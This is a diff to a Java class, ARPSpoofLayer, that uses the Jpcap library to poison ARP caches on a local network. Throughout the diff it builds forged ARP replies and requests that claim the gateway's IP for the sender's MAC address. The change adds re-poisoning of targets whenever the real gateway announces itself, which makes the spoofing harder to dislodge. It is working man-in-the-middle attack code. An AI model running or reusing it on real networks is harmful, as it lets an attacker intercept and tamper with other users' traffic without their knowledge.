@@ -7,6 +7,7 @@ import java.net.Inet4Address;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.List;
@@ -64,6 +65,41 @@ public class ARPSpoofLayer {
 		};
 	}
 	
+	private void sendARPSpoofPackets(byte[] gatewayAddress, JpcapSender sender) {
+		synchronized (spoofTargets) {
+			for (IPMACPair addr : spoofTargets) {
+				ARPPacket packet = new ARPPacket();
+				
+				EthernetPacket ether = new EthernetPacket();
+				ether.frametype = EthernetPacket.ETHERTYPE_ARP;
+				ether.src_mac = device.mac_address;
+				ether.dst_mac = addr.mac;
+				packet.datalink = ether;
+				
+				packet.hardtype = ARPPacket.HARDTYPE_ETHER;
+				packet.prototype = ARPPacket.PROTOTYPE_IP;
+				packet.hlen = 6;
+				packet.plen = 4;
+				packet.operation = ARPPacket.ARP_REPLY;
+				packet.sender_hardaddr = device.mac_address;
+				packet.sender_protoaddr = gatewayAddress;
+				packet.target_hardaddr = addr.mac;
+				packet.target_protoaddr = addr.ip.getAddress();
+				
+				synchronized (sender) {
+					sender.sendPacket(packet);
+				}
+				
+				packet.operation = ARPPacket.ARP_REQUEST;
+				packet.target_hardaddr = new byte[] {0, 0, 0, 0, 0, 0};
+				
+				synchronized (sender) {
+					sender.sendPacket(packet);
+				}
+			}
+		}
+	}
+	
 	/**
 	 * Create a new ARPSpoofLayer which will start gathering a list of IP/MAC pairs on the local network.
 	 * Note that this does an ARP ping across the local subnet, so you probably only want to use this on a /24, etc.
@@ -89,7 +125,9 @@ public class ARPSpoofLayer {
 		final String gateway = st.nextToken();
 		final Inet4Address gwAddress = (Inet4Address)InetAddress.getByName(gateway);
 		gatewayIP = gwAddress.getAddress();
-				
+		
+		final JpcapSender sender = JpcapSender.openDevice(device);
+		
 		// kick off a packet scanner
 		final JpcapCaptor captor = JpcapCaptor.openDevice(device, 65535, true, -1);
 		captor.setFilter("arp", true);
@@ -102,12 +140,22 @@ public class ARPSpoofLayer {
 							return;
 						try {
 							Inet4Address address = (Inet4Address)InetAddress.getByAddress(((ARPPacket)packet).sender_protoaddr);
+							boolean skip = true;
+							for (int i = 0; i < 4; i++)
+								if (address.getAddress()[i] != 0) {
+									skip = false;
+									break;
+								}
+							if (skip)
+								continue;
 							if (address.equals(gwAddress)) {
 								synchronized(gatewayLock) {
 									if (gatewayMAC == null) {
 										gatewayMAC = ((ARPPacket)packet).sender_hardaddr;
 										gatewayLock.notify();
 									}
+									if (Arrays.equals(((ARPPacket)packet).sender_hardaddr, gatewayMAC))
+										sendARPSpoofPackets(gatewayIP, sender);
 								}
 							} else {
 								synchronized(ips) {
@@ -128,8 +176,6 @@ public class ARPSpoofLayer {
 				}
 			}
 		}).start();
-		
-		final JpcapSender sender = JpcapSender.openDevice(device);
 		
 		// force an arping to the gateway first
 		{
@@ -211,35 +257,13 @@ public class ARPSpoofLayer {
 		new Thread(new Runnable() {
 			public void run() {
 				while (true) {
-					synchronized (spoofTargets) {
-						for (IPMACPair addr : spoofTargets) {
-							ARPPacket packet = new ARPPacket();
-							
-							EthernetPacket ether = new EthernetPacket();
-							ether.frametype = EthernetPacket.ETHERTYPE_ARP;
-							ether.src_mac = device.mac_address;
-							ether.dst_mac = addr.mac;
-							packet.datalink = ether;
-							
-							packet.hardtype = ARPPacket.HARDTYPE_ETHER;
-							packet.prototype = ARPPacket.PROTOTYPE_IP;
-							packet.hlen = 6;
-							packet.plen = 4;
-							packet.operation = ARPPacket.ARP_REPLY;
-							packet.sender_hardaddr = device.mac_address;
-							try {
-								packet.sender_protoaddr = InetAddress.getByName(gateway).getAddress();
-							} catch (UnknownHostException e) {
-								throw new RuntimeException(e); // Should not happen
-							}
-							packet.target_hardaddr = addr.mac;
-							packet.target_protoaddr = addr.ip.getAddress();
-							
-							synchronized (sender) {
-								sender.sendPacket(packet);
-							}
-						}
+					byte[] gatewayIP;
+					try {
+						gatewayIP = InetAddress.getByName(gateway).getAddress();
+					} catch (UnknownHostException e1) {
+						throw new RuntimeException(e1); // This should never happen
 					}
+					sendARPSpoofPackets(gatewayIP, sender);
 					try {
 						Thread.sleep(2000);
 					} catch (InterruptedException e) {
@@ -289,7 +313,7 @@ public class ARPSpoofLayer {
 		}
 		final JpcapSender sender = JpcapSender.openDevice(this.device);
 		synchronized(spoofTargets) {
-			List<ARPPacket> packets = new LinkedList<ARPPacket>();
+			final List<ARPPacket> packets = new LinkedList<ARPPacket>();
 			for (IPMACPair addr : spoofTargets) {
 				ARPPacket packet = new ARPPacket();
 				
@@ -315,17 +339,21 @@ public class ARPSpoofLayer {
 				}
 				packets.add(packet);
 			}
-			try {
-				Thread.sleep(1000);
-			} catch (InterruptedException e) { }
-			synchronized (sender) {
-				for (ARPPacket packet : packets)
-					sender.sendPacket(packet);
-			}
+			new Thread(new Runnable() {
+				public void run() {
+					try {
+						Thread.sleep(1000);
+					} catch (InterruptedException e) { }
+					synchronized (sender) {
+						for (ARPPacket packet : packets)
+							sender.sendPacket(packet);
+					}
+				}
+			}).start();
 			spoofTargets.clear();
 		}
 	}
-	
+
 	/**
 	 * Get a potential list of network interfaces to perform attacks on.
 	 * (ie those which have a local network address)
